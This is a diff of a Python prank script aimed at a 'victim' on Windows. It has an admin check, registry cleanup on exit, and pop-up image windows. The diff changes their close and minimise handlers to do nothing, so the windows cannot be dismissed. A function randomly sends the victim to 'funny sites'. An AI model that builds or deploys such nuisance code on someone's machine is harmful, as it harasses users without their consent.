@@ -2,7 +2,7 @@
 # Entry script should already handle this
 
 # I know this is a mess, but keeping in one file makes it easier to download
-
+# no idea why I decided to lazyload everything
 # —————————————————Housekeeping——————————————————
 
 import os
@@ -17,7 +17,6 @@ def is_admin() -> bool:
 
 
 def cleanup() -> None:
-    # LAzy load this stuff cause I won't use anywhere else
     import subprocess
     import winreg as reg
     
@@ -42,7 +41,6 @@ atexit.register(cleanup)
 
 # —————————————————Imports——————————————————
 import ctypes
-import pathlib
 import time
 import random
 from typing import Callable
@@ -348,10 +346,12 @@ def funny_windows():
         window = tk.Toplevel()
         window.resizable(False, False)
 
-        def on_close():
-            pass  # Prevent closing
-
-        window.protocol("WM_DELETE_WINDOW", on_close)
+        def _():
+            pass
+        
+        # Hehe
+        window.protocol("WM_DELETE_WINDOW", _)
+        window.protocol("WM_ICONIFY", _)
 
         image_content_url, mime_type = response['url'], response['mimetype'][6:]
         print(f"Image URL: {image_content_url}, MIME Type: {mime_type}")
@@ -379,7 +379,7 @@ def funny_windows():
     root.mainloop()
 
 
-# Feature 3 - Random rickroll redirects, no idea how to do this yet...
+# Feature 3 - Randomly open sub funny sites
 
 def redirects():
     """Randomly sends victim to funny places"""
